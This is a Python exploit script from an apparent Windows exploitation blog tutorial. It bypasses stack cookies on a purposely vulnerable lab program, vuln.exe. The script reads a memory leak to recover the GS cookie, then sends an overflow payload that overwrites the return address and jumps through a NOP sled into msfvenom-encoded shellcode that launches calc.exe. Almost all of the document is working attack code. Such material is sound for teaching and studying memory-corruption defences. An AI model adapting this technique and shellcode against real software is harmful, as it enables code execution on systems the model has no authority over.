"""
  gs_exploit.py
  Windows Modern Exploitation Blog Post
  Part 1: Stack Cookie (GS) Bypass
  Written by Clarissa https://clarissapodell.com

  The target program should be compiled with the command:
  C:\> cl /Zi vuln.c /link /NXCOMPAT:NO
"""

from subprocess import *
from struct import pack
import time
import sys


def print_banner():
  ''' Prints a banner message at the top of the terminal '''

  print """
    -------------------------------------------------------------
    # Windows Exploitation Part 1: Stack Cookie (GS) Bypass     #
    # by clarissapodell on 7/12/2018                            #
    # tested on Windows 10 x64, compiled as x86 32-bit process  #
    -------------------------------------------------------------
  """


def gen_shellcode():
  ''' Shellcode to execute an arbitrary command in Windows (CALC.exe)
      $ msfvenom -p windows/exec CMD=calc.exe -f python -e x86/shikata_ga_nai \
                 -b '\x00\x0a\x0d' -v shellcode
  '''

  shellcode =  ""
  shellcode += "\xda\xd8\xbd\x21\x75\x35\x98\xd9\x74\x24\xf4\x5a"
  shellcode += "\x31\xc9\xb1\x31\x31\x6a\x18\x03\x6a\x18\x83\xea"
  shellcode += "\xdd\x97\xc0\x64\xf5\xda\x2b\x95\x05\xbb\xa2\x70"
  shellcode += "\x34\xfb\xd1\xf1\x66\xcb\x92\x54\x8a\xa0\xf7\x4c"
  shellcode += "\x19\xc4\xdf\x63\xaa\x63\x06\x4d\x2b\xdf\x7a\xcc"
  shellcode += "\xaf\x22\xaf\x2e\x8e\xec\xa2\x2f\xd7\x11\x4e\x7d"
  shellcode += "\x80\x5e\xfd\x92\xa5\x2b\x3e\x18\xf5\xba\x46\xfd"
  shellcode += "\x4d\xbc\x67\x50\xc6\xe7\xa7\x52\x0b\x9c\xe1\x4c"
  shellcode += "\x48\x99\xb8\xe7\xba\x55\x3b\x2e\xf3\x96\x90\x0f"
  shellcode += "\x3c\x65\xe8\x48\xfa\x96\x9f\xa0\xf9\x2b\x98\x76"
  shellcode += "\x80\xf7\x2d\x6d\x22\x73\x95\x49\xd3\x50\x40\x19"
  shellcode += "\xdf\x1d\x06\x45\xc3\xa0\xcb\xfd\xff\x29\xea\xd1"
  shellcode += "\x76\x69\xc9\xf5\xd3\x29\x70\xaf\xb9\x9c\x8d\xaf"
  shellcode += "\x62\x40\x28\xbb\x8e\x95\x41\xe6\xc4\x68\xd7\x9c"
  shellcode += "\xaa\x6b\xe7\x9e\x9a\x03\xd6\x15\x75\x53\xe7\xff"
  shellcode += "\x32\xab\xad\xa2\x12\x24\x68\x37\x27\x29\x8b\xed"
  shellcode += "\x6b\x54\x08\x04\x13\xa3\x10\x6d\x16\xef\x96\x9d"
  shellcode += "\x6a\x60\x73\xa2\xd9\x81\x56\xc1\xbc\x11\x3a\x28"
  shellcode += "\x5b\x92\xd9\x34"
  return shellcode


def get_memleak_values(output):
  ''' Takes memleak output as an argument and returns the addresses needed
      to construct the exploit.
  '''

  # Split input on each space to create a list of addresses that can be accessed by index
  memleak = output.split(' ')

  # Obtain values by accessing the nth index in the output
  eax = int(memleak[17],16)       # index 17 = eax
  ret = int(memleak[8],16)        # index 8 = return address (esp)
  ebp = ret - 0x8

  # Output memory leak and calculated registers/values
  print "{0} {1}\n{2}\n".format(memleak[0], 40, ''.join(x + " " for x in memleak[1:]))
  print "[*] Leaked addresses from memleak:"
  print "eax = 0x{:>08x}".format(eax)
  print "ret = 0x{:>08x}".format(ret)
  print "cookie = 0x{:>08x}^0x{:>08x} = 0x{:>08x}\n".format(eax, ebp, eax^ebp)  # eax ^ ebp = cookie
  # Return tuple of values
  return (eax, ret)


def create_payload(eax, ret):
  ''' Helper function combines all components to create the payload.
      Final result should look like:
      [ 0x414141...1024 ][ cookie ][ 0x42424242 ][  eip  ][ 0x909090... ][ shellcode ]
  '''

  buf  = "\x41" * 1024    # buf
  buf += pack('<I', eax)  # eax = cookie
  buf += "\x42" * 4       # overwrite ebp w/ random 4-byte value
  buf += pack('<I', ret)  # overwrite eip w/ value from memleak
  buf += "\x90" * 100     # nopsled
  buf += gen_shellcode()  # shellcode
  # returns exploit payload
  return buf


def main():
  print_banner()  # print banner message at top

  exe  = "vuln.exe"  # name of program

  p = Popen(["C:\\blog\\" + exe], stdin=PIPE, stdout=PIPE, stderr=PIPE)
  time.sleep(2)  # allow a few seconds to start running

  cmd = ["tlist", "/p", exe]
  p_pid = check_output(cmd) # get PID from tasklist

  # Basic error checking
  if int(p_pid) > 0:
    # Returns greater than 0 for valid PID
    print "[*] Running %s in the background, pid=%d ...\n" % (exe, int(p_pid))
  else:
    # Returns less than 0 for invalid or non-existent PID
    print "[!] Unable to execute %s ...\n" % exe
    sys.exit(1)

  # Send input to memleak() through stdin pipe with newline appended
  loop = 40
  p.stdin.write(str(loop) + "\n")  

  # Read memleak() output from stdout pipe
  output  = p.stdout.readline().rstrip()

  # Save tuple of addresses from memleak helper function
  addr = get_memleak_values(output)

  # Craft exploit on the fly while vuln.exe waits for more input from STDIN in overflow()
  payload = create_payload(addr[0], addr[1])

  # Send exploit through stdin pipe
  p.stdin.write(payload + "\n")

  # vuln.exe prints "read> " prompt from main()
  read = p.stdout.readline()

  # vuln.exe prints "done" after returning from overflow() normally.
  done = p.stdout.readline()

  """
  If done contains a value, it means our exploit doesn't execute.  This will happen because scanf() leaves a newline 
  in the buffer which is satisfied by read() in overflow(). Execution does not stop at read() for user to enter data 
  and appears to have exited normally.  I deal with this situation below.
  """

  if done:
    print "[x] Rerun"  # Alert user that payload was never sent
  else:
    print "{0} (Sent {1} byte payload that executes CALC.exe)\n".format(read, len(payload))
    print "[+] Exploit of vuln.exe successful!!"

if __name__ == '__main__':
  main()